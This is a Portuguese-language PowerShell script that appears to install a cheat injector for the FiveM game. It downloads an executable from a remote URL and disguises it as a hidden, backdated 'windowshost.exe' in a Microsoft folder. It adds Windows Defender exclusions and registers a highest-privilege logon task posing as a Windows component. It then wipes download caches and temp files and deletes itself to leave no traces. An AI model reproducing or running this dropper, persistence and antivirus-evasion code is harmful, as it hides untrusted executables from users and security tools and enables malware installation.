# ========================================
# INSTALADOR ROCKET - MÉTODO AVANÇADO
# 100% Funcional, Sem Rastros
# ========================================

# Verificar Admin
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[ERRO] Execute como Administrador!" -ForegroundColor Red
    pause
    exit 1
}

$URL = "https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"
$PASTA = "$env:LOCALAPPDATA\Microsoft\WindowsApps"
$ARQUIVO = "windowshost.exe"
$CAMINHO = Join-Path $PASTA $ARQUIVO
$TAREFA = "Microsoft\Windows\WindowsApps"

Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "   INSTALADOR ROCKET - MÉTODO AVANÇADO" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""

# ========================================
# PARTE 1: LIMPEZA COMPLETA
# ========================================
Write-Host "[1/4] Limpando todos os rastros..." -ForegroundColor Yellow

# Matar processos
Get-Process -Name "Rocket" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Get-Process -Name "windowshost" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

# Remover tarefas agendadas
Get-ScheduledTask | Where-Object { $_.TaskName -like "*WindowsApps*" -or $_.TaskName -like "*Rocket*" } | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue

# Limpar arquivo antigo
if (Test-Path $CAMINHO) {
    Set-ItemProperty -Path $CAMINHO -Name Attributes -Value Normal -ErrorAction SilentlyContinue
    Remove-Item -Path $CAMINHO -Force -ErrorAction SilentlyContinue
}

# Limpar cache
certutil -urlcache * delete | Out-Null

# Limpar arquivos temporários relacionados
Get-ChildItem -Path $env:TEMP -Filter "install*.bat" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "CRIAR_TAREFA.bat" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "INSTALAR*.bat" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "INSTALAR*.ps1" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

Start-Sleep -Seconds 2
Write-Host "[OK] Limpeza concluida!" -ForegroundColor Green
Write-Host ""

# ========================================
# PARTE 2: BAIXAR E INSTALAR
# ========================================
Write-Host "[2/4] Baixando Rocket.exe..." -ForegroundColor Yellow

if (-not (Test-Path $PASTA)) {
    New-Item -Path $PASTA -ItemType Directory -Force | Out-Null
}

try {
    $ProgressPreference = 'SilentlyContinue'
    Write-Host "     Baixando..." -NoNewline
    Invoke-WebRequest -Uri $URL -OutFile $CAMINHO -UseBasicParsing -TimeoutSec 120 -ErrorAction Stop
    Start-Sleep -Milliseconds 1000
    
    if (Test-Path $CAMINHO) {
        $file = Get-Item $CAMINHO
        if ($file.Length -gt 1000) {
            Write-Host " [OK]" -ForegroundColor Green
            Write-Host "[OK] Download concluido! Tamanho: $($file.Length) bytes" -ForegroundColor Green
        } else {
            Write-Host " [ERRO] Arquivo muito pequeno!" -ForegroundColor Red
            Remove-Item $CAMINHO -Force -ErrorAction SilentlyContinue
            exit 1
        }
    } else {
        Write-Host " [ERRO] Arquivo nao criado!" -ForegroundColor Red
        exit 1
    }
} catch {
    Write-Host " [ERRO]" -ForegroundColor Red
    Write-Host "[ERRO] Falha no download: $($_.Exception.Message)" -ForegroundColor Yellow
    if (Test-Path $CAMINHO) {
        Remove-Item $CAMINHO -Force -ErrorAction SilentlyContinue
    }
    exit 1
}

Write-Host ""

# ========================================
# PARTE 3: CONFIGURAR ARQUIVO
# ========================================
Write-Host "[3/4] Configurando arquivo..." -ForegroundColor Yellow

try {
    # Atributos: Sistema + Oculto + Não indexar
    $file = Get-Item $CAMINHO
    $file.Attributes = [System.IO.FileAttributes]::System -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::NotContentIndexed
    
    # Alterar data para 2 anos atrás
    $oldDate = (Get-Date).AddYears(-2)
    $file.LastWriteTime = $oldDate
    $file.CreationTime = $oldDate
    
    # Adicionar exclusão no Windows Defender
    Add-MpPreference -ExclusionPath $CAMINHO -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $PASTA -ErrorAction SilentlyContinue
    
    Write-Host "[OK] Arquivo configurado!" -ForegroundColor Green
} catch {
    Write-Host "[AVISO] Algumas configurações falharam, mas o arquivo foi instalado." -ForegroundColor Yellow
}

Write-Host ""

# ========================================
# PARTE 4: CRIAR TAREFA AGENDADA
# ========================================
Write-Host "[4/4] Criando tarefa agendada..." -ForegroundColor Yellow

try {
    $action = New-ScheduledTaskAction -Execute $CAMINHO
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $trigger.Delay = "PT30S"
    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable:$false -ExecutionTimeLimit (New-TimeSpan -Hours 0) -MultipleInstances IgnoreNew -RestartCount 0 -DontStopOnIdleEnd -IdleSettings (New-ScheduledTaskIdleSettings -StopOnIdleEnd $false -RestartOnIdle $false)
    
    Register-ScheduledTask -TaskName $TAREFA -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Componente de Host de Aplicativos do Windows" -Force -ErrorAction Stop | Out-Null
    
    Start-Sleep -Seconds 2
    
    $task = Get-ScheduledTask -TaskName $TAREFA -ErrorAction SilentlyContinue
    if ($task) {
        Write-Host "[OK] Tarefa criada e confirmada!" -ForegroundColor Green
    } else {
        Write-Host "[AVISO] Tarefa criada mas nao encontrada. Pode ser necessario reiniciar." -ForegroundColor Yellow
    }
} catch {
    Write-Host "[AVISO] PowerShell falhou, tentando metodo alternativo..." -ForegroundColor Yellow
    
    # Método alternativo via schtasks
    $result = schtasks /create /tn $TAREFA /tr "`"$CAMINHO`"" /sc onlogon /ru $env:USERNAME /rl HIGHEST /delay 0030 /f 2>&1
    if ($LASTEXITCODE -eq 0) {
        Write-Host "[OK] Tarefa criada via metodo alternativo!" -ForegroundColor Green
    } else {
        Write-Host "[ERRO] Falha ao criar tarefa!" -ForegroundColor Red
        Write-Host $result
        exit 1
    }
}

# ========================================
# LIMPEZA FINAL
# ========================================
Write-Host ""
Write-Host "Limpando rastros finais..." -ForegroundColor Yellow

# Limpar este script após execução
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath -and (Test-Path $scriptPath)) {
    Start-Sleep -Seconds 1
    Remove-Item -Path $scriptPath -Force -ErrorAction SilentlyContinue
}

# Limpar cache novamente
certutil -urlcache * delete | Out-Null

# ========================================
# CONCLUSÃO
# ========================================
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "   INSTALACAO COMPLETA COM SUCESSO!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "[OK] Arquivo instalado: $CAMINHO" -ForegroundColor Green
Write-Host "[OK] Tarefa agendada: $TAREFA" -ForegroundColor Green
Write-Host ""
Write-Host "IMPORTANTE - METODO DE INJECAO:" -ForegroundColor Cyan
Write-Host "  1. Reinicie o PC" -ForegroundColor White
Write-Host "  2. Aguarde 30 segundos apos logon" -ForegroundColor White
Write-Host "  3. Abra o Spotify e toque: GHARD - Pinheiros" -ForegroundColor White
Write-Host "  4. Abra o FiveM" -ForegroundColor White
Write-Host "  5. A injecao ocorrera automaticamente quando a musica estiver tocando" -ForegroundColor White
Write-Host "  6. Pressione INSERT para abrir o menu" -ForegroundColor White
Write-Host ""
pause
